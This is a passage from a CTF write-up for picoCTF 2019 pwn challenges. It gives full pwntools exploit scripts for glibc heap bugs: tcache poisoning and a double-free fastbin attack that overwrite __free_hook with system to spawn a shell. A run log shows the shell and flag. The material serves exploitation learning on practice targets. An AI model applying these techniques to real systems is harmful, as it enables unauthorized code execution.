<p>Since we changed <code class="highlighter-rouge">__free_hook</code> to point to <code class="highlighter-rouge">system</code>, it will actually call <code class="highlighter-rouge">system(ptr_to_chunk_0)</code>, and if you imagine <code class="highlighter-rouge">ptr_to_chunk_0</code> to be a <code class="highlighter-rouge">char *</code>, it will call <code class="highlighter-rouge">system("/bin/sh\x00")</code>, giving us a shell:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Call free on the chunk with /bin/sh\x00 in it
# This will then call free('/bin/sh\x00') which calls system('/bin/sh\x00')
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>And so we use exactly 7 chunks to do the exploit. Perfect limit.</p>

<h3 id="final-exploit-1">Final exploit:</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./zero_to_hero'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'2019shell1.picoctf.com'</span><span class="p">,</span> <span class="mi">49929</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc-2.29.so'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">bp</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="c1"># Application logic
</span>
<span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">answer</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
    <span class="n">debug</span><span class="p">([])</span>

<span class="n">initialize</span><span class="p">(</span><span class="s">'y'</span><span class="p">)</span>

<span class="c1"># Calculate everything
</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">': '</span><span class="p">)</span>
<span class="n">system</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">system</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>

<span class="c1"># Add a 0x50 and 0x180 chunk
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># Chunk A
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x180</span><span class="p">)</span> <span class="c1"># Chunk B
</span>
<span class="c1"># Free them both
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Goes into 0x50 tcache bin
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Goes into 0x180 tcache bin
</span>
<span class="c1"># Get back the 0x50 chunk, but also null byte overflow into the 0x180 chunk
# Also put in /bin/sh\x00 into it for later use
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span> <span class="o">+</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># Chunk A
</span>
<span class="c1"># The 0x180 chunk's size is now actually 0x100 (due to null byte overflow), so we can free it again
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Goes into 0xf0 tcache bin
</span>
<span class="c1"># Get back the 0x100 chunk out of the 0x180 tcache bin
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x180</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x180</span><span class="p">)</span> <span class="c1"># Chunk B
</span>
<span class="c1"># But remember that it's size is still 0x100, so we can free it immediately
</span><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1"># Goes into 0xf0 tcache bin
</span>
<span class="c1"># Now: tcache[0x100] -&gt; Chunk B &lt;- Chunk B
# We do the usual tcache poisoning attack
</span>
<span class="c1"># Get Chunk B from 0xf0 tcache bin and change it's FD to __free_hook
</span><span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span> <span class="o">+</span> <span class="s">'D'</span><span class="o">*</span><span class="mh">0xe8</span><span class="p">)</span>

<span class="c1"># Allocates chunk B again
</span><span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="s">'E'</span><span class="o">*</span><span class="mh">0xf0</span><span class="p">)</span>

<span class="c1"># Allocates chunk on __free_hook, change it to system
</span><span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="s">'F'</span><span class="o">*</span><span class="mh">0xe8</span><span class="p">)</span>

<span class="c1"># Call free on the chunk with /bin/sh\x00 in it
# This will then call free('/bin/sh\x00') which calls system('/bin/sh\x00')
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-disco:/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero<span class="nv">$ </span>./exploit.py REMOTE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero/zero_to_hero'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x3ff000<span class="o">)</span>
    RUNPATH:  <span class="s1">'./'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/picoctf-2019/zero_to_hero/libc-2.29.so'</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+] Opening connection to 2019shell1.picoctf.com on port 49929: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Libc base: 0x7f0d11c61000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> system: 0x7f0d11cb3fd0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> __free_hook: 0x7f0d11e485a8
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
<span class="nv">$ </span><span class="nb">ls
</span>flag.txt
ld-2.29.so
libc.so.6
xinet_startup.sh
zero_to_hero
<span class="nv">$ </span><span class="nb">cat </span>flag.txt
picoCTF<span class="o">{</span>i_th0ught_2.29_f1x3d_d0ubl3_fr33?_fjqlovui<span class="o">}</span>
</code></pre></div></div>

<h1 id="sice_cream">sice_cream</h1>

<p>The solution that I came up with (including some help :P) for this challenge is absolutely mind blowing. I’m still not sure if it’s the intended solution.</p>

<p>There is also what I think is the official solution (<code class="highlighter-rouge">NotDeGhost</code> from redpwn told me about it after I solved it), so I will showcase that at the end of this writeup as well.</p>

<p>I usually put a TL;DR here, but no TL;DR will sufficiently show how amazing this challenge is. Huge props to the author <code class="highlighter-rouge">poortho</code>.</p>

<h3 id="challenge-2"><strong>Challenge</strong></h3>

<ul>
  <li><strong>Category:</strong> pwn</li>
  <li><strong>Points:</strong> 500</li>
  <li><strong>Solves:</strong> 25</li>
</ul>

<blockquote>
  <p>Just pwn this <a href="https://2019shell1.picoctf.com/static/b53566a7a55dd9ef5954e859d56c143d/sice_cream">program</a> and get a flag. Connect with <code class="highlighter-rouge">nc 2019shell1.picoctf.com</code> 6552 . <a href="https://2019shell1.picoctf.com/static/b53566a7a55dd9ef5954e859d56c143d/libc.so.6">libc.so.6</a> <a href="https://2019shell1.picoctf.com/static/b53566a7a55dd9ef5954e859d56c143d/sice_cream">ld-2.23.so</a></p>
</blockquote>

<h3 id="solution-2"><strong>Solution</strong></h3>

<p>Disclaimer: I won’t cover the basics of heap exploitation in this post. I have one post relating to a very easy glibc 2.23 heap exploitation challenge (<a href="/2019-09-30-bsides-delhi-message-saver/">BSides Delhi 2019: message_saver</a>), and another going much more in-depth with regards to how <code class="highlighter-rouge">malloc</code> and <code class="highlighter-rouge">free</code> kind of function, as well as what chunks and bins are (<a href="/2019-10-12-picoctf-2019-ghostdiary/">picoCTF 2019: Ghost_Diary</a>). If the terminology is unfamiliar to you, I suggest going through those writeups.</p>

<h4 id="reverse-engineering-the-binary-1">Reverse Engineering the binary</h4>

<p>The binary is pretty easy to reverse, so I will not go into details as to how I did it. I had to use <code class="highlighter-rouge">patchelf</code> initially to change which linker it was using, but other than that, here are its characteristics:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream<span class="nv">$ </span>file sice_cream
sice_cream: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/l, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>4112386366befae2dee50fe8ed7c013a8241c69c, stripped

vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream<span class="nv">$ </span>checksec sice_cream
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream/sice_cream'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x3ff000<span class="o">)</span>
    RUNPATH:  <span class="s1">'./'</span>
</code></pre></div></div>

<p>The program allows us to do the following:</p>

<ul>
  <li>
    <p>All user input in the program is done through the <code class="highlighter-rouge">read</code> function.</p>
  </li>
  <li>
    <p>At the beginning of the program, we are allowed to input 0x100 bytes for our name. This name variable is stored in the .bss segment, and since PIE is disabled, it is stored at the known address 0x602040.</p>
  </li>
  <li>
    <p>We are allowed to allocate chunks of size &lt;= 0x58. This is essentially what made this challenge so difficult. I will explain a bit more about that below. We are also only allowed to allocate 19 chunks total. There is no way to bring that limit down. Of course we find a way to do it anyway ;)</p>
  </li>
  <li>
    <p>Each allocated chunk is stored in a global array of pointers. This pointer is also at a known address right after the name variable. We can free these pointers, and the pointers themselves are not set to NULL after each free, thus allowing us to do double frees.</p>
  </li>
  <li>
    <p>We can “reintroduce” ourselves, and change our name. This functionality, as you will soon see, is a godsend for this challenge. It will read in 0x100 bytes again, then it print out our new name. This is the only form of a “leak” we have, so we have to use this to our advantage.</p>
  </li>
</ul>

<p>Let’s get onto exploiting now.</p>

<h4 id="step-1-unsorted-bin-leak">Step 1: <strong>Unsorted bin leak</strong></h4>

<p>As usual with heap challenges, we must first start out by getting a libc leak. I first added the application logic functions and some helper functions at the top:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s">'./sice_cream'</span>
<span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s">'2019shell1.picoctf.com'</span><span class="p">,</span> <span class="mi">38495</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc.so.6'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
    <span class="n">script</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
        <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">bp</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="c1"># Application logic
</span>
<span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">reintroduce</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'1.'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
    <span class="n">debug</span><span class="p">([])</span>
</code></pre></div></div>

<p>The way I got the libc leak was to do the following steps:</p>

<ol>
  <li>
    <p>At the beginning of the program, make our name look like a fake chunk of 0x61 size.</p>
  </li>
  <li>
    <p>Allocate three chunks of size 0x58.</p>
  </li>
  <li>
    <p>Double free one of them (<code class="highlighter-rouge">free(0)</code> -&gt; <code class="highlighter-rouge">free(1)</code> -&gt; <code class="highlighter-rouge">free(1)</code>).</p>
  </li>
  <li>
    <p>Reallocate a chunk of size 0x58, then set its first 8 bytes (the fd pointer) to our name variable.</p>
  </li>
  <li>
    <p>Three more allocations later, and we get a chunk right on top of our name variable</p>
  </li>
  <li>
    <p>Now we reintroduce ourselves again and make the chunk header a size of 0x91 and create a bunch of fake chunks</p>
  </li>
  <li>
    <p>Free the chunk, and it places the address of <code class="highlighter-rouge">main_arena + 0x58</code> into the <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> fields of our “fake” chunk</p>
  </li>
  <li>
    <p>Leak it by reintroducing ourselves and typing in enough characters</p>
  </li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">'''
For step 1, we want a libc leak. PIE is disabled, and the only leak we have is when we
"reintroduce" ourselves, and the program tells us what our name is.

Knowing this, the easiest way to get a libc leak is to first get a fake chunk on top of
the name variable by doing a fastbin attack. Then, we simply change the name to make it
appear to be a chunk of size 0x91, then free it. This causes the addr of main_arena+0x58
to be placed in the fd and bk fields of our fake chunk. The fd and bk fields are
essentially name[2] and name[3] respectively, if each index is considered 8 bytes long
'''</span>

<span class="c1"># Initialize our name to look like a fake chunk header with size 0x61
</span><span class="n">initialize</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>

<span class="c1"># Address of name global variable (PIE is disabled)
</span><span class="n">fake_chunk</span> <span class="o">=</span> <span class="mh">0x602040</span>

<span class="c1"># Quick double free fast bin attack to get a chunk on top of name
# Allocate three chunks for setup (third chunk might not be needed)
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 0
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 1
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 2
</span>
<span class="c1"># Double free chunk 0
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1"># Get chunk 0 back, and overwrite it's FD with fake chunk
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span> <span class="o">+</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">)</span> <span class="c1"># 3
</span>
<span class="c1"># Three more allocations, chunk 6 will be at our name variable
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 4
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 5
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x58</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0x58</span><span class="p">)</span> <span class="c1"># 6
</span>
<span class="c1"># Next, we change name so that it looks like a fake chunk with size 0x91
# We also construct a bunch of fake chunks.
# Only two fake chunks are required, I just made a bunch of them cuz I was lazy
# The two fake chunks allow us to free this 0x91 sized chunk and bypass security checks
</span><span class="n">reintroduce</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">*</span><span class="mi">23</span><span class="p">)</span>

<span class="c1"># Free fake chunk, places the address of main_arena+0x58 into its fd and bk fields
</span><span class="n">free</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="c1"># We overwrite the chunk header with 'AAAAAAA\n'
# This causes reintroduce to say our name, and print out 'AAAAAAA\n&lt;main_arena_addr+0x58&gt;'
# We just format it correctly to get the leak
</span><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">reintroduce</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x8</span><span class="o">+</span><span class="mh">0x7</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># Calculate all offsets needed
</span><span class="n">main_arena</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x58</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'main arena: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">main_arena</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'system: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'__free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
</code></pre></div></div>

<h4 id="step-2-overwrite-__free_hook-but-how">Step 2: <strong>Overwrite __free_hook, but HOW?</strong></h4>

<p>Here is where the exploit gets very interesting. Here is what I tried initially:</p>

<ol>
  <li>
    <p>I tried your standard fastbin attack to get a chunk above <code class="highlighter-rouge">__malloc_hook</code>, but quickly realized that due to the 0x58 size constraint, this was not possible. We’d need to be able to allocate chunks of size 0x60-0x68 to be able to do this attack (FAILED).</p>
  </li>
  <li>
    <p>Then, I tried to overwrite <code class="highlighter-rouge">_IO_2_1_stdin_</code>’s <code class="highlighter-rouge">_IO_BUF_END</code> to the address of <code class="highlighter-rouge">main_arena + 0x58</code> by doing the unsorted bin attack. The idea was that after doing this, any user input performed using <code class="highlighter-rouge">scanf</code> would use the space between <code class="highlighter-rouge">_IO_BUF_BASE</code> and <code class="highlighter-rouge">_IO_BUF_END</code> to store our input. We could overwrite <code class="highlighter-rouge">__malloc_hook</code> this way, since <code class="highlighter-rouge">_IO_BUF_BASE</code> is set to right above <code class="highlighter-rouge">__malloc_hook</code>, and <code class="highlighter-rouge">main_arena + 0x58</code> is way after <code class="highlighter-rouge">__malloc_hook</code>. However, of course the program only uses <code class="highlighter-rouge">read</code> to read in user input and not <code class="highlighter-rouge">scanf</code>, therefore this didn’t work either (FAILED).</p>
  </li>
  <li>
    <p>Then, I tried to do the House of Orange attack. However, I’ve actually never done that attack before, and from my limited knowledge of it, it seemed like the 0x58 size constraint prevented me from doing that attack as well (FAILED).</p>
  </li>
</ol>

<p>I spent about a day and a half doing all of that, and kept trying to look for similar writeups. I was then told by NotDeGhost from redpwn that the author <code class="highlighter-rouge">poortho</code> had made a similar challenge in the past. A little bit of doxxing and I found this one writeup of <code class="highlighter-rouge">hard_heap</code> from HSCTF-6, which had a broken link, but I could go on the author’s github and download the <code class="highlighter-rouge">index.html</code> file that was used for the writeup and then view it in Firefox.</p>

